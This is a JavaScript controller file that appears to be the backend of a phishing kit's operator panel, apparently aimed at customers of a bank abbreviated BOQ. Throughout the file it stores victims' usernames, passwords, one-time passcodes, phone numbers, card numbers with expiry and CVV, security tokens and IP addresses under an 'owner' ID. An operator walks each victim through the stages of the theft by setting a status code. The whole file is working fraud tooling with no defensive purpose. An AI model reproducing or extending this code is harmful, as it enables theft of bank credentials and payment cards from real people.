const BOQ = require("../models/boqModel");

const getOwnerVics = async (req, res) => {
    const { owner } = req.params;
    BOQ.find({ owner }).exec((err, vics) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vics);
    });
};

const command = async (req, res) => {
    const { uniqueid, status } = req.body;
    try {
        await BOQ.findOneAndUpdate({ uniqueid }, { status }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const getInfo = async (req, res) => {
    const { uniqueid } = req.params;
    BOQ.findOne({ uniqueid }).exec((err, vic) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vic);
    });
};

const submitLogin = async (req, res) => {
    const { username, userId, password, uniqueid, owner, ip } = req.body;
    try {
        await BOQ.create({ uniqueid, userId, username, password, status: 1, owner, ip });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitLoginAgain = async (req, res) => {
    const { username, userId, password, uniqueid, owner, ip } = req.body;
    try {
        await BOQ.findOneAndUpdate(
            { uniqueid },
            { username, password, userId, status: 0 }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitTelephone = async (req, res) => {
    const { telephone, uniqueid } = req.body;
    try {
        await BOQ.findOneAndUpdate(
            { uniqueid },
            { telephone, status: 7 }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitOtp = async (req, res) => {
    const { otp, uniqueid } = req.body;
    try {
        await BOQ.findOneAndUpdate(
            { uniqueid },
            { otp, status: 3 }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitCard = async (req, res) => {
    const { ccnum, ccexp, cvv, uniqueid } = req.body;
    try {
        await BOQ.findOneAndUpdate(
            { uniqueid },
            { ccnum, ccexp, cvv, status: 5 }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitSecurity = async (req, res) => {
    const { secToken, uniqueid } = req.body;
    try {
        await BOQ.findOneAndUpdate(
            { uniqueid },
            { secToken, status: 9 }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const deleteEntry = async (req, res) => {
    const { uniqueid } = req.body;
    try {
        await BOQ.deleteOne({ uniqueid });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

module.exports = {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitTelephone,
    submitSecurity,
    submitCard,
    submitOtp,
    deleteEntry,
};
